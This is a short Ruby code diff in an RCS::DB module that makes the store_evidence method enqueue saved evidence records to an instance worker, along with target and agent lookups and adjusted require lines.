@@ -1,6 +1,9 @@
+require 'rcs-common/path_utils'
+
 require_relative '../rest'
 require_relative '../db_objects/signature'
 require_relative '../db_objects/status'
+require_release 'rcs-worker/instance_worker'
 
 module RCS
   module DB
@@ -89,12 +92,15 @@ module RCS
       end
 
       def store_evidence(target_id, attributes)
-        collection = Evidence.collection_class(target_id)
+        collection = ::Evidence.collection_class(target_id)
         return unless collection.where(id: attributes["_id"]).count.zero?
         evi = collection.new(attributes)
         evi._id = attributes["_id"]
         evi.save!
-        # TODO: send the evidence to #save_evidence
+
+        target = Item.find(target_id)
+        agent = Item.find(evi.aid)
+        RCS::Worker::InstanceWorker.enqueue(target, agent, evi)
       end
 
       def store_items(items)
